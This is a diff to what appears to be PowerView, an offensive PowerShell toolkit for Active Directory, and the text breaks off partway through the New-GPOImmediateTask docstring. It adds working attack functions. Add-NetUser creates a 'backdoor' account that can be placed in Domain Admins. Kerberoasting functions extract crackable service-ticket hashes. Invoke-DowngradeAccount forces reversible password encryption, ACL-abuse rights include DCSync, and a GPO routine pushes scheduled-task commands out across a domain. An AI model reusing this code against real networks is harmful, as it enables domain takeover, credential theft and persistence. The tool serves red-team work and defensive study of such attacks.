@@ -2570,6 +2570,142 @@ Invoke-RevertToSelf -TokenHandle $Token
     Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
 }
 
+function Add-NetUser {
+<#
+    .SYNOPSIS
+        Adds a domain user or a local user to the current (or remote) machine,
+        if permissions allow, utilizing the WinNT service provider and
+        DirectoryServices.AccountManagement, respectively.
+
+        The default behavior is to add a user to the local machine.
+        An optional group name to add the user to can be specified.
+    .PARAMETER UserName
+        The username to add. If not given, it defaults to 'backdoor'
+    .PARAMETER Password
+        The password to set for the added user. If not given, it defaults to 'Password123!'
+    .PARAMETER GroupName
+        Group to optionally add the user to.
+    .PARAMETER ComputerName
+        Hostname to add the local user to, defaults to 'localhost'
+    .PARAMETER Domain
+        Specified domain to add the user to.
+    .EXAMPLE
+        PS C:\> Add-NetUser -UserName john -Password 'Password123!'
+
+        Adds a localuser 'john' to the local machine with password of 'Password123!'
+    .EXAMPLE
+        PS C:\> Add-NetUser -UserName john -Password 'Password123!' -ComputerName server.testlab.local
+
+        Adds a localuser 'john' with password of 'Password123!' to server.testlab.local's local Administrators group.
+    .EXAMPLE
+        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain ''
+
+        Adds the user "john" with password "password" to the current domain and adds
+        the user to the domain group "Domain Admins"
+    .EXAMPLE
+        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain 'testing'
+
+        Adds the user "john" with password "password" to the 'testing' domain and adds
+        the user to the domain group "Domain Admins"
+    .Link
+        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
+#>
+
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $UserName = 'backdoor',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Password = 'Password123!',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $GroupName,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('HostName')]
+        [String]
+        $ComputerName = 'localhost',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Domain
+    )
+
+    if ($Domain) {
+
+        $DomainObject = Get-NetDomain -Domain $Domain
+        if(-not $DomainObject) {
+            Write-Warning "Error in grabbing $Domain object"
+            return $Null
+        }
+
+        # add the assembly we need
+        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+
+        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
+        # get the domain context
+        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $DomainObject
+
+        # create the user object
+        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $Context
+
+        # set user properties
+        $User.Name = $UserName
+        $User.SamAccountName = $UserName
+        $User.PasswordNotRequired = $False
+        $User.SetPassword($Password)
+        $User.Enabled = $True
+
+        Write-Verbose "Creating user $UserName to with password '$Password' in domain $Domain"
+
+        try {
+            # commit the user
+            $User.Save()
+            "[*] User $UserName successfully created in domain $Domain"
+        }
+        catch {
+            Write-Warning '[!] User already exists!'
+            return
+        }
+    }
+    else {
+
+        Write-Verbose "Creating user $UserName to with password '$Password' on $ComputerName"
+
+        # if it's not a domain add, it's a local machine add
+        $ObjOu = [ADSI]"WinNT://$ComputerName"
+        $ObjUser = $ObjOu.Create('User', $UserName)
+        $ObjUser.SetPassword($Password)
+
+        # commit the changes to the local machine
+        try {
+            $Null = $ObjUser.SetInfo()
+            "[*] User $UserName successfully created on host $ComputerName"
+        }
+        catch {
+            Write-Warning '[!] Account already exists!'
+            return
+        }
+    }
+
+    # if a group is specified, invoke Add-NetGroupUser and return its value
+    if ($GroupName) {
+        # if we're adding the user to a domain
+        if ($Domain) {
+            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
+            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
+        }
+        # otherwise, we're adding to a local group
+        else {
+            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
+            "[*] User $UserName successfully added to group $GroupName on host $ComputerName"
+        }
+    }
+}
 
 function Get-DomainSPNTicket {
 <#
@@ -2587,7 +2723,7 @@ This function will either take one/more SPN strings, or one/more PowerView.User 
 (the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
 using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
 portion of the ticket is then extracted and output in either crackable John or Hashcat
-format (deafult of Hashcat).
+format (deafult of John).
 
 .PARAMETER SPN
 
@@ -2621,9 +2757,9 @@ Request kerberos service tickets for all SPNs passed on the pipeline.
 
 .EXAMPLE
 
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR
+Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
 
-Request kerberos service tickets for all users with non-null SPNs and output in JTR format.
+Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.
 
 .INPUTS
 
@@ -2661,7 +2797,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
-        $OutputFormat = 'Hashcat',
+        $OutputFormat = 'John',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -2715,10 +2851,6 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
                 $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
 
-                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
-                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
-                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
-
                 # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                 # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                 if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
@@ -2728,7 +2860,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
                     # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                     if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
-                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                         $Hash = $null
                         $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                     } else {
@@ -2742,9 +2874,8 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 }
 
                 if($Hash) {
-                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
                     if ($OutputFormat -match 'John') {
-                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
+                        $HashFormat = "$($SamAccountName):`$krb5tgs`$$($Etype)`$$Hash"
                     }
                     else {
                         if ($DistinguishedName -ne 'UNKNOWN') {
@@ -2754,14 +2885,17 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                             $UserDomain = 'UNKNOWN'
                         }
 
-                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
+                        # hashcat output format
                         $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                     }
                     $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 }
 
+                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
+                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
+                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
-                $Out
+                Write-Output $Out
             }
         }
     }
@@ -2788,7 +2922,6 @@ Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-Domain
 
 Uses Get-DomainUser to query for user accounts with non-null service principle
 names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
-The ticket format can be specified with -OutputFormat <John/Hashcat>.
 
 .PARAMETER Identity
 
@@ -2829,28 +2962,28 @@ Specifies the maximum amount of time the server spends searching. Default of 120
 
 Switch. Specifies that the searcher should also return deleted/tombstoned objects.
 
-.PARAMETER OutputFormat
-
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
-Defaults to 'Hashcat'.
-
 .PARAMETER Credential
 
 A [Management.Automation.PSCredential] object of alternate credentials
 for connection to the target domain.
 
+.PARAMETER OutputFormat
+
+Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
+Defaults to 'John'.
+
 .EXAMPLE
 
 Invoke-Kerberoast | fl
 
-Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).
+Kerberoasts all found SPNs for the current domain.
 
 .EXAMPLE
 
 Invoke-Kerberoast -Domain dev.testlab.local | fl
 
-Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
-format instead of Hashcat.
+Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
+format instead of John (the default).
 
 .EXAMPLE
 
@@ -2910,14 +3043,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [Switch]
         $Tombstone,
 
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
-        $OutputFormat = 'Hashcat',
-
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
+        $OutputFormat = 'John'
     )
 
     BEGIN {
@@ -3261,284 +3394,149 @@ A custom PSObject with LDAP hashtable properties translated.
 #
 ########################################################
 
-function Get-DomainSearcher {
+filter Get-DomainSearcher {
 <#
-.SYNOPSIS
+    .SYNOPSIS
 
-Helper used by various functions that builds a custom AD searcher object.
+        Helper used by various functions that takes an ADSpath and
+        domain specifier and builds the correct ADSI searcher object.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain  
+    .PARAMETER Domain
 
-.DESCRIPTION
+        The domain to use for the query, defaults to the current domain.
 
-Takes a given domain and a number of customizations and returns a
-System.DirectoryServices.DirectorySearcher object. This function is used
-heavily by other LDAP/ADSI searcher functions (Verb-Domain*).
+    .PARAMETER DomainController
 
-.PARAMETER Domain
+        Domain controller to reflect LDAP queries through.
 
-Specifies the domain to use for the query, defaults to the current domain.
+    .PARAMETER ADSpath
 
-.PARAMETER LDAPFilter
+        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
+        Useful for OU queries.
 
-Specifies an LDAP query string that is used to filter Active Directory objects.
+    .PARAMETER ADSprefix
 
-.PARAMETER Properties
+        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
 
-Specifies the properties of the output object to retrieve from the server.
+    .PARAMETER PageSize
 
-.PARAMETER SearchBase
+        The PageSize to set for the LDAP searcher object.
 
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
+    .PARAMETER Credential
 
-.PARAMETER SearchBasePrefix
+        A [Management.Automation.PSCredential] object of alternate credentials
+        for connection to the target domain.
 
-Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").
+    .EXAMPLE
 
-.PARAMETER Server
+        PS C:\> Get-DomainSearcher -Domain testlab.local
 
-Specifies an Active Directory server (domain controller) to bind to for the search.
+    .EXAMPLE
 
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainSearcher -Domain testlab.local
-
-Return a searcher for all objects in testlab.local.
-
-.EXAMPLE
-
-Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'
-
-Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.
-
-.EXAMPLE
-
-Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
-
-Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).
-
-.OUTPUTS
-
-System.DirectoryServices.DirectorySearcher
+        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
 #>
 
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('System.DirectoryServices.DirectorySearcher')]
-    [CmdletBinding()]
-    Param(
-        [Parameter(ValueFromPipeline = $True)]
-        [ValidateNotNullOrEmpty()]
+    param(
+        [Parameter(ValueFromPipeline=$True)]
         [String]
         $Domain,
 
-        [ValidateNotNullOrEmpty()]
-        [Alias('Filter')]
         [String]
-        $LDAPFilter,
+        $DomainController,
 
-        [ValidateNotNullOrEmpty()]
-        [String[]]
-        $Properties,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('ADSPath')]
         [String]
-        $SearchBase,
+        $ADSpath,
 
-        [ValidateNotNullOrEmpty()]
         [String]
-        $SearchBasePrefix,
+        $ADSprefix,
 
-        [ValidateNotNullOrEmpty()]
-        [Alias('DomainController')]
-        [String]
-        $Server,
-
-        [ValidateSet('Base', 'OneLevel', 'Subtree')]
-        [String]
-        $SearchScope = 'Subtree',
-
-        [ValidateRange(1, 10000)]
+        [ValidateRange(1,10000)] 
         [Int]
-        $ResultPageSize = 200,
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ServerTimeLimit = 120,
-
-        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
-        [String]
-        $SecurityMasks,
-
-        [Switch]
-        $Tombstone,
+        $PageSize = 200,
 
         [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
+        $Credential
     )
 
-    PROCESS {
-        if ($PSBoundParameters['Domain']) {
-            $TargetDomain = $Domain
+    if(!$Credential) {
+        if(!$Domain){
+            $Domain = (Get-NetDomain).name
+        }
+        elseif(!$DomainController) {
+            try {
+                # if there's no -DomainController specified, try to pull the primary DC
+                #   to reflect queries through
+                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
+            }
+            catch {
+                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
+            }
+        }
+    }
+    elseif (!$DomainController) {
+        try {
+            $DomainController = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
+        }
+        catch {
+            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
+        }
 
-            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
-                # see if we can grab the user DNS logon domain from environment variables
-                $UserDomain = $ENV:USERDNSDOMAIN
-                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
-                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
-                }
-            }
+        if(!$DomainController) {
+            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
         }
-        elseif ($PSBoundParameters['Credential']) {
-            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain
-            $DomainObject = Get-Domain -Credential $Credential
-            $BindServer = ($DomainObject.PdcRoleOwner).Name
-            $TargetDomain = $DomainObject.Name
+    }
+
+    $SearchString = "LDAP://"
+
+    if($DomainController) {
+        $SearchString += $DomainController
+        if($Domain){
+            $SearchString += "/"
         }
-        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
-            # see if we can grab the user DNS logon domain from environment variables
-            $TargetDomain = $ENV:USERDNSDOMAIN
-            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
-                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
-            }
+    }
+
+    if($ADSprefix) {
+        $SearchString += $ADSprefix + ","
+    }
+
+    if($ADSpath) {
+        if($ADSpath -like "GC://*") {
+            # if we're searching the global catalog
+            $DN = $AdsPath
+            $SearchString = ""
         }
         else {
-            # otherwise, resort to Get-Domain to retrieve the current domain object
-            write-verbose "get-domain"
-            $DomainObject = Get-Domain
-            $BindServer = ($DomainObject.PdcRoleOwner).Name
-            $TargetDomain = $DomainObject.Name
-        }
-
-        if ($PSBoundParameters['Server']) {
-            # if there's not a specified server to bind to, try to pull a logon server from ENV variables
-            $BindServer = $Server
-        }
-
-        $SearchString = 'LDAP://'
-
-        if ($BindServer -and ($BindServer.Trim() -ne '')) {
-            $SearchString += $BindServer
-            if ($TargetDomain) {
-                $SearchString += '/'
-            }
-        }
-
-        if ($PSBoundParameters['SearchBasePrefix']) {
-            $SearchString += $SearchBasePrefix + ','
-        }
-
-        if ($PSBoundParameters['SearchBase']) {
-            if ($SearchBase -Match '^GC://') {
-                # if we're searching the global catalog, get the path in the right format
-                $DN = $SearchBase.ToUpper().Trim('/')
-                $SearchString = ''
-            }
-            else {
-                if ($SearchBase -match '^LDAP://') {
-                    if ($SearchBase -match "LDAP://.+/.+") {
-                        $SearchString = ''
-                        $DN = $SearchBase
-                    }
-                    else {
-                        $DN = $SearchBase.SubString(7)
-                    }
+            if($ADSpath -like "LDAP://*") {
+                if($ADSpath -match "LDAP://.+/.+") {
+                    $SearchString = ""
                 }
                 else {
-                    $DN = $SearchBase
+                    $ADSpath = $ADSpath.Substring(7)
                 }
             }
+            $DN = $ADSpath
         }
-        else {
-            # transform the target domain name into a distinguishedName if an ADS search base is not specified
-            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
-                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
-            }
-        }
-
-        $SearchString += $DN
-        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"
-
-        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
-            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
-            # bind to the inital search object using alternate credentials
-            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
-        }
-        else {
-            # bind to the inital object using the current credentials
-            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-        }
-
-        $Searcher.PageSize = $ResultPageSize
-        $Searcher.SearchScope = $SearchScope
-        $Searcher.CacheResults = $False
-        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
-
-        if ($PSBoundParameters['ServerTimeLimit']) {
-            $Searcher.ServerTimeLimit = $ServerTimeLimit
-        }
-
-        if ($PSBoundParameters['Tombstone']) {
-            $Searcher.Tombstone = $True
-        }
-
-        if ($PSBoundParameters['LDAPFilter']) {
-            $Searcher.filter = $LDAPFilter
-        }
-
-        if ($PSBoundParameters['SecurityMasks']) {
-            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
-                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
-                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
-                'None' { [System.DirectoryServices.SecurityMasks]::None }
-                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
-                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
-            }
-        }
-
-        if ($PSBoundParameters['Properties']) {
-            # handle an array of properties to load w/ the possibility of comma-separated strings
-            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
-            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
-        }
-
-        $Searcher
     }
+    else {
+        if($Domain -and ($Domain.Trim() -ne "")) {
+            $DN = "DC=$($Domain.Replace('.', ',DC='))"
+        }
+    }
+
+    $SearchString += $DN
+    Write-Verbose "Get-DomainSearcher search string: $SearchString"
+
+    if($Credential) {
+        Write-Verbose "Using alternate credentials for LDAP connection"
+        $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+        $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
+    }
+    else {
+        $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+    }
+
+    $Searcher.PageSize = $PageSize
+    $Searcher
 }
 
 
@@ -5810,6 +5808,95 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                     }
                 }
             }
+        }
+    }
+}
+
+
+function Invoke-DowngradeAccount {
+<#
+    .SYNOPSIS
+        Set reversible encryption on a given account and then force the password
+        to be set on next user login. To repair use "-Repair".
+    .PARAMETER SamAccountName
+        The SamAccountName of the domain object you're querying for.
+    .PARAMETER Name
+        The Name of the domain object you're querying for.
+    .PARAMETER Domain
+        The domain to query for objects, defaults to the current domain.
+    .PARAMETER DomainController
+        Domain controller to reflect LDAP queries through.
+    .PARAMETER Filter
+        Additional LDAP filter string for the query.
+    .PARAMETER Repair
+        Switch. Unset the reversible encryption flag and force password reset flag.
+    .EXAMPLE
+        PS> Invoke-DowngradeAccount -SamAccountName jason
+        Set reversible encryption on the 'jason' account and force the password to be changed.
+    .EXAMPLE
+        PS> Invoke-DowngradeAccount -SamAccountName jason -Repair
+        Unset reversible encryption on the 'jason' account and remove the forced password change.
+#>
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position=0,ValueFromPipeline=$True)]
+        [String]
+        $SamAccountName,
+
+        [String]
+        $Name,
+
+        [String]
+        $Domain,
+
+        [String]
+        $DomainController,
+
+        [String]
+        $Filter,
+
+        [Switch]
+        $Repair
+    )
+
+    process {
+        $Arguments = @{
+            'SamAccountName' = $SamAccountName
+            'Name' = $Name
+            'Domain' = $Domain
+            'DomainController' = $DomainController
+            'Filter' = $Filter
+        }
+
+        # splat the appropriate arguments to Get-ADObject
+        $UACValues = Get-ADObject @Arguments | select useraccountcontrol | ConvertFrom-UACValue
+
+        if($Repair) {
+
+            if($UACValues.Keys -contains "ENCRYPTED_TEXT_PWD_ALLOWED") {
+                # if reversible encryption is set, unset it
+                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
+            }
+
+            # unset the forced password change
+            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue -1
+        }
+
+        else {
+
+            if($UACValues.Keys -contains "DONT_EXPIRE_PASSWORD") {
+                # if the password is set to never expire, unset
+                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536
+            }
+
+            if($UACValues.Keys -notcontains "ENCRYPTED_TEXT_PWD_ALLOWED") {
+                # if reversible encryption is not set, set it
+                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
+            }
+
+            # force the password to be changed on next login
+            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue 0
         }
     }
 }
@@ -8343,7 +8430,7 @@ for connection to the target domain.
 
 .PARAMETER Rights
 
-Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
+Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync', 'Enroll'.
 Defaults to 'All'.
 
 .PARAMETER RightsGUID
@@ -8490,7 +8577,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
         [Management.Automation.CredentialAttribute()]
         $Credential = [Management.Automation.PSCredential]::Empty,
 
-        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
+        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync', 'Enroll')]
         [String]
         $Rights = 'All',
 
@@ -8554,6 +8641,8 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
                     # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                     #   when applied to a domain's ACL, allows for the use of DCSync
                     'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
+                    # allows for certificate enrollment
+                    'Enroll' { '0e10c968-78fb-11d2-90d4-00c04f79dc55' }
                 }
             }
 
@@ -8668,7 +8757,7 @@ for connection to the target domain.
 
 .PARAMETER Rights
 
-Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
+Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync', 'Enroll'.
 Defaults to 'All'.
 
 .PARAMETER RightsGUID
@@ -8771,7 +8860,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
         [Management.Automation.CredentialAttribute()]
         $Credential = [Management.Automation.PSCredential]::Empty,
 
-        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
+        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync', 'Enroll')]
         [String]
         $Rights = 'All',
 
@@ -8835,6 +8924,8 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
                     # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                     #   when applied to a domain's ACL, allows for the use of DCSync
                     'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
+                    # allows for certificate enrollment
+                    'Enroll' { '0e10c968-78fb-11d2-90d4-00c04f79dc55' }
                 }
             }
 
@@ -9143,6 +9234,100 @@ Custom PSObject with ACL entries.
     }
 }
 
+function Get-NetGmsa {
+<#
+.SYNOPSIS
+
+Search for all Group Managed Service Accounts in AD.
+
+Author: Jean-Francois Maes (@jfmaes)  
+License: BSD 3-Clause  
+Required Dependencies: Get-DomainSearcher, Get-ObjectACL
+
+.DESCRIPTION
+
+
+.PARAMETER Domain
+
+Specifies the domain to use for the query, defaults to the current domain.
+
+
+
+.PARAMETER DomainController
+
+Specifies an Active Directory server (domain controller) to bind to.
+
+
+.PARAMETER Credential
+
+A [Management.Automation.PSCredential] object of alternate credentials
+for connection to the target domain.
+
+
+ .PARAMETER ADSpath
+
+        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
+        Useful for OU queries.
+    
+
+.OUTPUTS
+
+PowerView.GSMA
+
+Custom PSObject with translated gMSA property fields.
+#>
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(ValueFromPipeline=$True)]
+        [String]
+        $gmsaName = '*',
+        
+        [String]
+        $Domain,
+
+        [String]
+        $DomainController,
+
+        [String]
+        $ADSpath,
+
+        [Switch]
+        $FullData,
+
+        [ValidateRange(1,10000)] 
+        [Int]
+        $PageSize = 200,
+
+        [Management.Automation.PSCredential]
+        $Credential
+    )
+
+    begin {
+        $GMSASearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
+    }
+    process {
+        if ($GMSASearcher) {
+                $GMSASearcher.filter="(&(ObjectClass=msDS-GroupManagedServiceAccount)(name=$gmsaName))"
+            }
+
+            try {
+                $GMSASearcher.FindAll() | Where-Object {$_} | ForEach-Object {
+                    if ($FullData) {
+                        # convert/process the LDAP fields for each result
+                        Convert-LDAPProperty -Properties $_.Properties
+                    }
+                    else { 
+                        # otherwise just returning the ADS paths of the OUs
+                        $_.properties.adspath
+                    }
+                }
+            }
+            catch {
+                Write-Warning $_
+            }
+        }
+  }
 
 function Get-DomainOU {
 <#
@@ -14159,6 +14344,457 @@ Ouputs a hashtable representing the parsed GptTmpl.inf file.
     }
 }
 
+
+function New-GPOImmediateTask {
+<#
+.SYNOPSIS
+
+Builds an 'Immediate' schtask to push out through a specified GPO.
+
+Authors: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-DomainGPO
+
+.DESCRIPTION
+
+Builds an 'Immediate' schtask to push out through a specified GPO.  First an
+XML file is created here
+'<GPO path>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml'.
+This XML file contains configuration for our 'Immediate' task such as which
+command will be run with which account.
+Furthermore, for the 'Immediate' task to be run we need to update the
+gPCMachineExtensionNames or gPCUserExtensionNames attribute of the GPO object
+with the GUID corresponding to an 'Immediate' task.
+Finally, the versioNumber must be updated both in the GPO object and the
+GPT.ini file if we want the 'Immediate' task to be applied without 'gpupdate
+/force'.
+Greatly inspired from https://labs.mwrinfosecurity.com/tools/sharpgpoabuse/.
+
+.PARAMETER TaskName
+
+Name for the schtask to recreate. Required.
+
+.PARAMETER Command
+
+The command to execute with the task, defaults to 'powershell'.
+
+.PARAMETER CommandArguments
+
+The arguments to supply to the -Command being launched.
+
+.PARAMETER TaskDescription
+
+An optional description for the task.
+
+.PARAMETER TaskAuthor
+
+The displayed author of the task, defaults to 'NT AUTHORITY\System'.
+
